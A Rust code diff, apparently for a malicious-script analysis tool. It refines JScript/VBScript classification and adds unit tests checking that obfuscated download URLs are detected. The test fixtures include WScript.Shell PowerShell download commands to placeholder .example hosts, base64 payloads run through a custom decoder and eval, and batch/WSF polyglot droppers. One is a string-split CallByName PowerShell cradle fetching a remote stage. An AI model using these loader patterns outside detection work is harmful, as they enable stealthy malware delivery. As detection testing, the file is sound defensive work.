@@ -906,6 +906,27 @@ mod analyze_tests {
     }
 
     #[test]
+    fn polyglot_explicit_jscript_tag_wins_over_wscript_heuristic() {
+        let mut env = Environment::new(&Config::default());
+        super::pre_scan_polyglot_script_block(
+            br#"<script language="JScript">
+var sh = new ActiveXObject("WScript.Shell");
+sh.Run("powershell Invoke-WebRequest https://explicit-js.example/p");
+</script>"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_vbs.is_empty()
+                && env.all_extracted_jscript.iter().any(|payload| payload
+                    .windows("ActiveXObject".len())
+                    .any(|window| { window.eq_ignore_ascii_case(b"ActiveXObject") })),
+            "explicit JScript tag misclassified: js={:?} vbs={:?}",
+            env.all_extracted_jscript,
+            env.all_extracted_vbs
+        );
+    }
+
+    #[test]
     fn polyglot_vbscript_block_queues_vbs_payload() {
         let mut env = Environment::new(&Config::default());
         super::pre_scan_polyglot_script_block(
@@ -7703,12 +7724,16 @@ fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
         if !body.trim().is_empty() {
             let tag = &text[abs_open..abs_open + tag_end_rel + 1];
             let payload = body.as_bytes().to_vec();
-            if crate::util::contains_ascii_case_insensitive(tag, "vbscript")
-                || looks_like_vbs_script(&body.to_ascii_lowercase())
-            {
+            if crate::util::contains_ascii_case_insensitive(tag, "vbscript") {
                 push_unique_payload(&mut env.all_extracted_vbs, payload);
-            } else {
+            } else if crate::util::contains_ascii_case_insensitive(tag, "jscript")
+                || crate::util::contains_ascii_case_insensitive(tag, "javascript")
+                || crate::util::contains_ascii_case_insensitive(tag, "ecmascript")
+                || !looks_like_vbs_script(&body.to_ascii_lowercase())
+            {
                 push_unique_payload(&mut env.all_extracted_jscript, payload);
+            } else {
+                push_unique_payload(&mut env.all_extracted_vbs, payload);
             }
         }
         idx = body_end + "</script>".len();
@@ -40514,6 +40539,147 @@ mod js_url_extraction_tests {
             !has,
             "JS atob member property alias was decoded as a payload: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn js_custom_base64_decoder_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://custom-b64-js.example/p')";
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let js = format!(
+            r#"
+            var p = decode("{encoded}");
+            eval(p);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            "#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://custom-b64-js.example/p"
+            )
+        });
+        assert!(has, "JS custom base64 decoder URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_custom_base64_decoder_powershell_payload_is_scanned() {
+        let payload = r#"powershell $p='https','://custom-b64-ps-js.example','/stage'; $u=($p -join ''); iwr $u"#;
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let script = format!(
+            r#"
+            @echo off
+            cscript //nologo "%~f0?.wsf"
+            exit /b
+            <script language="JScript">
+            var p = decode("{encoded}");
+            eval(p);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            </script>
+            "#
+        );
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://custom-b64-ps-js.example/stage"
+            ) || matches!(t,
+                Trait::UrlVariable { url, .. } if url == "https://custom-b64-ps-js.example/stage"
+            ) || matches!(t,
+                Trait::DownloadInDeobText { src, .. } if src == "https://custom-b64-ps-js.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "decoded JS PowerShell payload URL missed: {:?}\ndeob:\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn js_custom_base64_decoder_callbyname_powershell_payload_emits_download() {
+        let payload = concat!(
+            "powershell ",
+            "$tty55='(New-','Obje','ct Ne','t.We','bCli','ent)';",
+            "$tty=iex($tty55 -join '');",
+            "$rot='Down','load','Str','ing';",
+            "$rotJ=($rot -join '');",
+            "$bnt='https','://callbyname-wsf.example','/stage.txt';",
+            "$bntJ=($bnt -join '');",
+            "$mv=[Microsoft.VisualBasic.Interaction]::CallByname($tty,$rotJ,[Microsoft.VisualBasic.CallType]::Method,$bntJ);",
+        );
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let script = format!(
+            r#"
+            @echo off
+            cscript //nologo "%~f0?.wsf"
+            exit /b
+            <script language="JScript">
+            var oo = decode("{encoded}");
+            var r = new ActiveXObject("WScript.Shell");
+            r.Run(oo, 0);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            </script>
+            "#
+        );
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "https://callbyname-wsf.example/stage.txt"
+                )
+            }),
+            "decoded JS CallByName PowerShell payload missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
